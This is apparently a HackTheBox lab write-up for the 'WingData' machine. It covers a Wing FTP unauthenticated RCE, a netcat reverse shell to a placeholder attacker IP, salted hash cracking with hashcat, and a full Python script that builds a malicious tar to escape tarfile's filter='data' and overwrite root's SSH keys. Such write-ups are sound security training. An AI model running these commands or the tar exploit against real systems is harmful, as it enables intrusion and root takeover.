# HackTheBox — WingData Write-up

> **Difficulty:** Medium  
> **OS:** Linux  
> **IP:** 10.129.X.X  
> **Flags:** user.txt ✅ | root.txt ✅

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Foothold — CVE-2025-47812 (Wing FTP RCE)](#2-foothold--cve-2025-47812-wing-ftp-rce)
3. [Post-Exploitation Enumeration](#3-post-exploitation-enumeration)
4. [Lateral Movement — Cracking wacky's Password](#4-lateral-movement--cracking-wackys-password)
5. [Privilege Escalation — Malicious Tar Path Traversal](#5-privilege-escalation--malicious-tar-path-traversal)
6. [Key Takeaways](#6-key-takeaways)

---

## 1. Reconnaissance

### Port Scan

```bash
nmap -sC -sV -oN nmap/initial 10.129.X.X
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 9.x |
| 80   | HTTP    | Apache 2.4.66 |

The web server on port 80 redirected to `wingdata.htb`. Adding the relevant virtual hosts to `/etc/hosts`:

```
10.129.X.X    wingdata.htb ftp.wingdata.htb
```

### Web Enumeration

Visiting `http://wingdata.htb` revealed a corporate landing page. The page source contained a link to `http://ftp.wingdata.htb`, which hosted a **Wing FTP Server v7.4.3** web client login portal (version visible in the page footer).

```bash
nmap -p 5466 10.129.X.X   # Wing FTP admin panel (also discovered later)
```

---

## 2. Foothold — CVE-2025-47812 (Wing FTP RCE)

### Vulnerability Analysis

Wing FTP Server v7.4.3 is vulnerable to **CVE-2025-47812** — an unauthenticated Remote Code Execution via NULL byte injection in the username parameter during login. The server writes session files containing the injected Lua code, which is executed when the `/dir.html` endpoint is accessed.

**Exploit chain:**
1. `POST /loginok.html` with username `anonymous\x00<lua_payload>` → server returns a UID cookie
2. `GET /dir.html` with the UID cookie → Lua payload executes on the server

The public exploit (ExploitDB 52347) handles this automatically.

### Getting a Reverse Shell

Confirming network connectivity first:

```bash
python3 52347.py -u http://ftp.wingdata.htb -c "ping -c 3 <ATTACKER_IP>"
```

After confirming ICMP responses, establishing a shell. Note: `/dev/tcp` is disabled on Debian, so `netcat` with `-e` is used instead:

```bash
# Listener
nc -lvnp 4444

# Exploit
python3 52347.py -u http://ftp.wingdata.htb -c "nc -e /bin/bash <ATTACKER_IP> 4444"
```

Shell received as `wingftp` (uid=1000). Stabilising with PTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## 3. Post-Exploitation Enumeration

### Wing FTP Data Directory

```bash
ls /opt/wftpserver/Data/1/users/
# anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
```

Each XML file contains a SHA-256 password hash for the corresponding FTP user:

```bash
cat /opt/wftpserver/Data/1/users/wacky.xml | grep Password
# <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

### Discovering the Password Salt

The domain settings file revealed that password hashing uses a salt:

```bash
grep -i "salt\|SHA256" /opt/wftpserver/Data/1/settings.xml
```

```xml
<EnableSHA256>1</EnableSHA256>
<EnablePasswordSalting>1</EnablePasswordSalting>
<SaltingString>WingFTP</SaltingString>
```

The hash format is: `SHA256(salt + password)` → i.e., `SHA256("WingFTP" + plaintext_password)`

### Internal Services

```bash
ss -tlnp
```

A service was found listening on `127.0.0.1:8080` (Wing FTP's HTTP interface) — proxied externally by Apache on `ftp.wingdata.htb`.

---

## 4. Lateral Movement — Cracking wacky's Password

### Hashcat with Salt Prepend Rule

Using hashcat's `--rule-left` to prepend the known salt `WingFTP` to each rockyou.txt candidate before hashing:

```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca" > wacky_hash.txt

hashcat -m 1400 wacky_hash.txt /usr/share/wordlists/rockyou.txt \
    --rule-left '$W$i$n$g$F$T$P'
```

Password cracked. SSH access obtained:

```bash
ssh wacky@10.129.X.X
```

### User Flag

```bash
cat /home/wacky/user.txt
```

---

## 5. Privilege Escalation — Malicious Tar Path Traversal

### Sudo Enumeration

```bash
sudo -l
```

```
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3
        /opt/backup_clients/restore_backup_clients.py *
```

### Analysing the Script

```python
# /opt/backup_clients/restore_backup_clients.py (key excerpt)
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

The script extracts a tar archive as **root** into a staging directory under `/opt/backup_clients/restored_backups/`. It uses Python's `filter="data"` which is meant to block path traversal and malicious symlinks.

### The Bypass — Chained Symlink Confusion

`filter="data"` validates each tar member in isolation, but does **not** track the runtime filesystem state created by previously extracted members. By crafting a tar that first creates a long-named directory structure and uses intermediate symlinks, we can make the filter lose track of the resolved path — escaping the destination sandbox.

The exploit creates the following structure inside the tar:

1. A series of **deep nested directories** (247-char names) paired with **relative symlinks** pointing back to them — confusing the depth-tracking logic in the filter
2. A **final escape symlink** that resolves to `/root/.ssh/authorized_keys` after traversal
3. A **regular file** named `escape` (same name as the symlink) that contains our SSH public key — Python's tarfile overwrites the symlink target with this file's content when extracting the second entry with the same name

### Exploit Script

First, generate an SSH key pair:

```bash
ssh-keygen -t rsa -N "" -f /tmp/root_key -q
```

Then create the malicious tar (`exploit.py`):

```python
import tarfile, os, io

with open('/tmp/root_key.pub', 'r') as f:
    ssh_key = f.read()

comp = 'd' * 247
steps = 'abcdefghijklmnop'
path = ''

with tarfile.open('/opt/backup_clients/backups/backup_9999.tar', 'w') as tar:
    for i in steps:
        # Create a deep directory with a 247-char name
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)

        # Create a relative symlink pointing to that directory
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)

        path = os.path.join(path, comp)

    # Build the escape chain — a symlink that traverses back to filesystem root
    linkpath = os.path.join('/'.join(steps), 'l' * 254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = '../' * len(steps)
    tar.addfile(l)

    # Symlink pointing through the escape chain to root's authorized_keys
    e = tarfile.TarInfo('escape')
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + '/../../../../root/.ssh/authorized_keys'
    tar.addfile(e)

    # Regular file with same name — overwrites the symlink target (root's authorized_keys)
    content = ssh_key.encode()
    key_file = tarfile.TarInfo('escape')
    key_file.type = tarfile.REGTYPE
    key_file.size = len(content)
    tar.addfile(key_file, fileobj=io.BytesIO(content))

print('[+] Malicious tar created: backup_9999.tar')
```

Transfer and execute:

```bash
scp exploit.py wacky@10.129.X.X:/tmp/exploit.py
python3 /tmp/exploit.py
```

### Triggering the Exploit

```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
    -b backup_9999.tar -r restore_pwn
```

### SSH as Root

```bash
ssh -o StrictHostKeyChecking=no -i /tmp/root_key root@localhost
```

### Root Flag

```bash
cat /root/root.txt
```

---

## 6. Key Takeaways

**Initial Access — CVE-2025-47812**

Wing FTP Server versions up to 7.4.3 allow unauthenticated code execution via NULL byte injection into the session Lua engine. Always check for public exploits against identified service versions during enumeration.

**Password Cracking with Salted Hashes**

The Wing FTP configuration file exposed the salt string and hashing algorithm. When conventional wordlist attacks fail, always look for salt information in nearby configuration files before escalating to more expensive attacks. Using `--rule-left` in hashcat to prepend a known salt is far more efficient than custom scripts.

**filter="data" Bypass via Chained Symlinks**

Python's `tarfile` `filter="data"` (introduced in 3.12 as a security hardening measure) validates path safety by checking each extracted member's resolved path. However, it does not maintain a stateful view of the filesystem as extraction progresses. By chaining symlinks through deep directory structures, the filter can be made to miscalculate the final resolved path, allowing arbitrary file write as the extracting user (root in this case).

This highlights that **allowing untrusted archives to be extracted as a privileged user is inherently dangerous**, even with filtering mechanisms in place. The safer approach is to extract in an isolated environment or as an unprivileged user.

---

*Write-up by luizgsv | HackTheBox Season 10*
